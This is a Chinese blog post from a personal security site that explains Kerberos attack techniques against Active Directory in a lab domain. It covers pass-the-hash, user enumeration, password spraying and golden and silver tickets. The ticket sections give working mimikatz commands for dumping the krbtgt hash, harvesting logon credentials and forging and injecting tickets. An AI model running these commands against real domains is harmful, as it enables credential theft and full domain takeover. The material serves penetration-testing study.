<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="内网渗透之kerberos协议攻击面分析"><meta name="keywords" content="内网渗透"><meta name="author" content="我是小吴啦"><meta name="copyright" content="我是小吴啦"><title>内网渗透之kerberos协议攻击面分析 | Chen's Blog</title><link rel="shortcut icon" href="/4.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REQ"><span class="toc-number">2.1.</span> <span class="toc-text">AS-REQ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hash传递攻击"><span class="toc-number">2.1.1.</span> <span class="toc-text">hash传递攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#域用户枚举"><span class="toc-number">2.1.2.</span> <span class="toc-text">域用户枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#密码喷洒攻击"><span class="toc-number">2.1.3.</span> <span class="toc-text">密码喷洒攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REP"><span class="toc-number">2.2.</span> <span class="toc-text">AS-REP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#黄金票据攻击"><span class="toc-number">2.2.1.</span> <span class="toc-text">黄金票据攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REP-Roasting攻击"><span class="toc-number">2.2.2.</span> <span class="toc-text">AS-REP Roasting攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TGS-REP"><span class="toc-number">2.3.</span> <span class="toc-text">TGS-REP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#白银票据攻击"><span class="toc-number">2.3.1.</span> <span class="toc-text">白银票据攻击</span></a></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">我是小吴啦</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">97</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">12</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://jagger2zr.com" target="_blank" rel="noopener">Jagger</a><a class="author-info-links__name text-center" href="https://mochazz.github.io" target="_blank" rel="noopener">mochazz学长</a><a class="author-info-links__name text-center" href="https://www.cnblogs.com/bflw/" target="_blank" rel="noopener">强哥</a><a class="author-info-links__name text-center" href="http://p0desta.com/" target="_blank" rel="noopener">p0desta</a><a class="author-info-links__name text-center" href="https://github.com/Bypass007" target="_blank" rel="noopener">Bypass师傅</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1587989465494&amp;di=25bf7ddc1982d8dbb238d7a90a78781e&amp;imgtype=0&amp;src=http%3A%2F%2Fimgs.aixifan.com%2Fo_1c8epo34e1nji18d3hn917iv1rha65.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Chen's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">内网渗透之kerberos协议攻击面分析</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-09-01</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文对kerberos协议中的各个角度的攻击方式进行分析总结</p>
<a id="more"></a>

<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/1.png" alt="image-20200907132626500"></p>
<p>对于Kerberos协议的分析可以参考文章：<a href="https://xz.aliyun.com/t/8187" target="_blank" rel="noopener">https://xz.aliyun.com/t/8187</a></p>
<p>​                    </p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>我们知道在Kerberos协议中有三方参与，分别是<code>Client</code>，<code>Server</code>，<code>KDS</code>,，并且在<code>KDS</code>中分别有<code>AS-身份认证服务</code>和<code>TGS-票据授予服务</code>，其中<code>AS</code>的作用就是用来验证<code>Client</code>端的身份，验证通过后，<code>AS</code>就会分发<code>TGT票据</code>给<code>Client</code>，<code>Client</code>借助该<code>TGT</code>票据，向<code>TGS-票据认证服务</code>发送请求，<code>TGS-票据授予服务</code>发放<code>ST服务票据</code>给<code>Client</code>…..</p>
<p><strong>AS-REQ&amp;&amp;AS-REP</strong></p>
<h2 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS-REQ"></a>AS-REQ</h2><p>在<code>AS-REQ</code>这个阶段，当某个域用户试图访问域中的某个服务时，输入用户名和密码，本机的<code>Kerberos</code>服务会向<code>KDC</code>的<code>AS</code>认证服务发送一个<code>AS-REQ</code>认证请求。在这一阶段，可能会发生的攻击手法有<code>域用户枚举</code>等</p>
<h3 id="hash传递攻击"><a href="#hash传递攻击" class="headerlink" title="hash传递攻击"></a>hash传递攻击</h3><p>会使用hash传递攻击的原因</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登陆内网中的其他计算机。</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)在Windows系统中，通常会使用NTLM身份认证，NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成.攻击者如果使用工具将散列值传递到其他计算机中，进行权限验证，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，实现对计算机的控制。</span><br></pre></td></tr></table></figure>



<p>使用hash传递攻击用很多方法，比如使用<code>mimikatz</code>，<code>msf-PsExec</code>，其实作用都差不多，其目的都是通过<strong>已获得的hash值传递至其他机器，进行权限认证，进行模拟用户，实现对计算机的控制</strong></p>
<p>参考文章：<a href="https://www.cnblogs.com/Xy--1/p/13216686.html" target="_blank" rel="noopener">哈希传递攻击利用(Pass The Hash)</a></p>
<p>PS:实际上我自己有点疑惑，在使用<code>mimikatz</code>或者<code>msf</code>进行攻击的时候，并没有抓到<code>AS-REQ</code>的请求包，因为这个攻击手法是基于<code>NTLM</code>协议的。</p>
<h3 id="域用户枚举"><a href="#域用户枚举" class="headerlink" title="域用户枚举"></a>域用户枚举</h3><p>在<code>Kerberos协议</code>中在<code>AS</code>阶段，<code>Client</code>发送<code>AS-REQ</code>请求，请求字段中的<code>cname</code>是否在<code>Kerberos</code>协议中真实存在，将返回不同的<code>AS-REP</code>数据包，<strong>域用户枚举</strong>的攻击手法一般有三种：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）msf中的auxiliary/gather/kerberos_enumusers</span><br><span class="line">    </span><br><span class="line">（<span class="number">2</span>）Java –jar kerbguess.jar –r [domain] –d [user <span class="keyword">list</span>] –s [DC IP]</span><br><span class="line">    </span><br><span class="line">（<span class="number">3</span>）Nmap –p <span class="number">88</span> –script-args krb5-enum-users.realm=’[domain]’,userdb=[user <span class="keyword">list</span>] [DC IP]</span><br></pre></td></tr></table></figure>

<p>但是不管哪一种攻击都需要被攻击的主机需要开启88端口.</p>
<p>先把内网的流量转发出来，然后<code>nmap</code>扫描是否打开88端口.</p>
<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/2.png" alt="image-20200910213758996"></p>
<p>然后使用<code>msf中的auxiliary/gather/kerberos_enumusers</code>进行攻击</p>
<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/3.png" alt="image-20200910214250661"></p>
<p>本质上用户枚举是通过<code>Kerberos</code>错误代码来加以利用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">KDC_ERR_PREAUTH_REQUIRED 需要额外的预认证 =&gt; 目前/已启用</span><br><span class="line">KDC_ERR_CLIENT_REVOKED 客户端凭证已被吊销 =&gt; 锁定/禁用</span><br><span class="line">KDC_ERR_C_PRINCIPAL_UNKNOWN 在Kerberos数据库中找不到客户端 =&gt; 不存在</span><br></pre></td></tr></table></figure>



<p>看到如下两种情况:</p>
<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/4.png" alt="image-20200910214533089"></p>
<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/5.png" alt="image-20200910214832332"></p>
<h3 id="密码喷洒攻击"><a href="#密码喷洒攻击" class="headerlink" title="密码喷洒攻击"></a>密码喷洒攻击</h3><p>许多渗透测试人员和攻击者通常都会使用一种被称为“密码喷洒（Password Spraying）”的技术来进行测试和攻击。对密码进行喷洒式的攻击，这个叫法很形象，因为它属于自动化密码猜测的一种。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率。攻击者首先会从他们已有的密码列表开始尝试，并以最脆弱的密码开始（“Fall2017”，“Winter2018”“123456”等）入手。普通的爆破就是用户名固定，爆破密码，但是密码喷洒，是用固定的密码去跑用户名。</p>
<p>参考：<a href="https://cloud.tencent.com/developer/article/1333517" target="_blank" rel="noopener">如何通过审计安全事件日志检测密码喷洒(Password Spraying)攻击</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\DomainPasswordSpray.ps1</span><br><span class="line">Invoke-DomainPasswordSpray -Password 密码</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/7.png" alt="image-20200910232109726"></p>
<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/6.png" alt="image-20200910232045336"></p>
<p>利用工具<code>DomainPasswordSpray</code>,对域用户执行密码喷洒攻击。</p>
<p>PS:在抓包过程中，发现这个攻击手法实际上也不是基于<code>Kerberos</code>协议的，而且<code>LDAP</code>协议在发挥作用，<code>DomainPasswordSpray</code>在默认情况下，将利用<code>LDAP</code>从域中导出用户列表，然后扣掉被锁定的用户，再用固定密码进行密码喷洒。</p>
<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/8.png" alt="image-20200910234223632"></p>
<p>从流量可以看到此时正在进行密码喷洒攻击。</p>
<p>​                                                                                          </p>
<h2 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS-REP"></a>AS-REP</h2><p>在<code>AS-REP</code>这个阶段，当某个域用户试图访问域中的某个服务时，输入用户名和密码后，，<code>KDC</code>中的<code>AS-身份认证</code>收到<code>AS-REQ</code>之后将会返回一个<code>AS-REP</code>其中包含的<code>TGT</code>票据，将成为下一阶段重要的认证凭据。此时可能会发生<code>黄金票据攻击</code>，<code>AS-REP Roasting攻击</code></p>
<h3 id="黄金票据攻击"><a href="#黄金票据攻击" class="headerlink" title="黄金票据攻击"></a>黄金票据攻击</h3><p>在<code>Kerberos</code>协议认证过过程中，<code>KDC</code>返回的<code>AS-REP</code>其中的<code>TGT</code>票据。</p>
<p>在生成<code>TGT</code>票据的过程中，<code>user,domain,timestamp</code>以及一些权限信息将会经过<code>krbtgt</code>账户hash的加密。所以换言之，如果<code>TGT</code>被伪造，就跳过了<code>AS认证</code>，因为已经有了<code>TGT</code>票据，就可以直接进行第二次认证，就可以和任意的Server进行通信。而伪造的<code>TGT</code>票据就叫做<code>黄金票据</code></p>
<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/9.png" alt="image-20200911133954249"></p>
<p><code>KDC</code>返回的<code>AS-REP</code>数据包中有两个部分的数据</p>
<p>一部分：Client <code>NTLM-Hash</code>加密的<code>Login Session-key</code></p>
<p>一部分：<code>TGT</code>（<code>krbtgt</code>域账户<code>NTLM-Hash</code>加密的<code>Session-Key as</code>，<code>Client-info</code>，<code>timestamp</code>） </p>
<p><strong>使用黄金票据，通常在拿下域控后，用来作权限维持的一种方式。因为krbtgt域账户的密码基本不会更改，即使域管密码被修改，它也不会改变。</strong></p>
<p>创建黄金票据，我们需要知道以下信息：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">要伪造的域用户（这里我们一般填写域管理员账户）</span><br><span class="line"></span><br><span class="line">域名</span><br><span class="line"></span><br><span class="line">域的SID值（域成员SID值去掉最后的）</span><br><span class="line"></span><br><span class="line">krbtgt账号的hash值或AES<span class="number">-256</span>值</span><br></pre></td></tr></table></figure>



<p>测试环境：</p>
<p>域：god.org</p>
<p>域成员：192.168.3.14    10.10.10.80</p>
<p>域成员：10.10.10.201</p>
<p>域控：10.10.10.10</p>
<p>参考：<a href="https://www.cnblogs.com/KevinGeorge/p/9337747.html" target="_blank" rel="noopener">黄金票据（Golden Ticket）的原理与实践</a></p>
<p>在域控下运行<code>mimikatz</code></p>
<p><strong>获取krbtgt的SID和hash值</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz log <span class="string">"lsadump::dcsync  /domain:tide.org /user:krbtgt"</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/10.png" alt="image-20200911185813035"></p>
<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/11.png" alt="image-20200911185902476"></p>
<p>获取到SID和hash</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SID:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-2952760202</span><span class="number">-1353902439</span><span class="number">-2381784089</span>（后面的<span class="number">502</span>不要了）</span><br><span class="line">Hash NTLM:<span class="number">58e91</span>a5ac358d86513ab224312314061</span><br><span class="line">domain:god.org</span><br></pre></td></tr></table></figure>



<p>获得<code>SID</code>和<code>hash</code>之后，我们就能在生成票据了，<code>PS:生成票据和导入票据要在管理员权限下进行</code></p>
<p>这时候我们在一台域用户中进行操作</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 清除票据缓存</span></span><br><span class="line">kerberos::purge</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 生成票据</span></span><br><span class="line">kerberos::golden /admin:Administrator /domain:god.org /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-2952760202</span><span class="number">-1353902439</span><span class="number">-2381784089</span> /krbtgt:<span class="number">58e91</span>a5ac358d86513ab224312314061 /ticket:Administrator.kiribi</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 导入票据</span></span><br><span class="line">kerberos::ptt Administrator.kiribi</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 查看票据</span></span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>

<p>在导入票据后，票据将被导入至内存中。</p>
<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/12.png" alt="image-20200914164822626"></p>
<p>在导入票据后，可尝试访问域控</p>
<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/14.png" alt="image-20200914164939393"></p>
<p>那么其实这么说来，在获得域控后，通过伪造票据实际上，我们可以伪造成任何一个用户，但是一般情况下，我们伪造域控管理员的票据就好了，用于权限提升，权限维持，利用黄金票据做权限维持的杀伤力还是蛮大的。</p>
<p>参考：<a href="https://www.anquanke.com/post/id/172900#h2-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/172900#h2-5</a></p>
<h3 id="AS-REP-Roasting攻击"><a href="#AS-REP-Roasting攻击" class="headerlink" title="AS-REP Roasting攻击"></a>AS-REP Roasting攻击</h3><p>这个攻击的局限性实在是太大了，个人认为在实战的过程中，应该可行性，不大吧…..</p>
<p>参考文章：</p>
<p><a href="https://blog.csdn.net/shuteer_xu/article/details/106066628" target="_blank" rel="noopener">https://blog.csdn.net/shuteer_xu/article/details/106066628</a></p>
<p><a href="https://blog.csdn.net/qq_36119192/article/details/105076459" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/105076459</a></p>
<p><strong>TGS-REQ&amp;&amp;TGS-REP</strong></p>
<p>这一阶段可能存在的攻击在TGS-REP阶段</p>
<h2 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS-REP"></a>TGS-REP</h2><p><code>Client</code>发起<code>TGS-REQ</code>请求的目的就是获得一个<code>ST票据</code>，因为当Client需要访问某服务器中的某服务时，需要<code>&quot;门票&quot;--ST服务票据</code>，而在<code>TGS-REP</code>阶段就是为了返回一个<code>ST服务票据</code></p>
<h3 id="白银票据攻击"><a href="#白银票据攻击" class="headerlink" title="白银票据攻击"></a>白银票据攻击</h3><p>回顾一下<strong>黄金票据攻击</strong>的必要条件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">要伪造的域用户（这里我们一般填写域管理员账户）</span><br><span class="line"></span><br><span class="line">域名</span><br><span class="line"></span><br><span class="line">域的SID值（域成员SID值去掉最后的）</span><br><span class="line"></span><br><span class="line">krbtgt账号的hash值或AES<span class="number">-256</span>值</span><br></pre></td></tr></table></figure>

<p>这样我们可以直接使用这些信息来伪造一个<strong>TGT票据</strong>来绕过用户身份的认证，因为这些信息是不会变的，域管理员的密码可能会被更改，伪造的这个票据可以让我们伪装成比如域控管理员这样的高权限用户，去请求任何域内服务。这是黄金票据，发生在身份认证阶段。</p>
<p><strong>白银票据</strong>则是发生在<code>TGS-REP</code>阶段，白银票据的利用过程是伪造一个<strong>ST服务票据</strong>，通过获得服务的服务账号和密码来生成一张可以访问该服务的ST服务票据。<strong>白银票据会通过相应的服务账号来伪造ST服务票据，例如：LDAP、MSSQL、WinRM、DNS、CIFS等，范围有限，只能获取对应服务的权限。</strong></p>
<p>注意：<strong>但是要注意的一点是，伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则银票将不起作用。</strong></p>
<p>比如使用白银票据伪造CIFS，和黄金票据的攻击手法一样，就是权限没有那么高</p>
<p>（1）使用mimikatz获得服务账号的NTLM哈希值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::Debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>



<p>（2）进行白银票据攻击</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:xie.com /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-2189311154</span><span class="number">-2766837956</span><span class="number">-1982445477</span>(SID) /target:WIN2008.xie.com /service:cifs /rc4:<span class="number">290</span>c699798b47b809500b3bbd4ed3e2f(NTML-HASH) /user:administrator /ptt</span><br></pre></td></tr></table></figure>





</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">我是小吴啦</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/">http://yoursite.com/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/11/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack3/"><i class="fa fa-chevron-left">  </i><span>内网渗透之vulnstack3</span></a></div><div class="next-post pull-right"><a href="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/"><span>内网渗透之vulnstack1</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1587989465494&amp;di=25bf7ddc1982d8dbb238d7a90a78781e&amp;imgtype=0&amp;src=http%3A%2F%2Fimgs.aixifan.com%2Fo_1c8epo34e1nji18d3hn917iv1rha65.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By 我是小吴啦</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>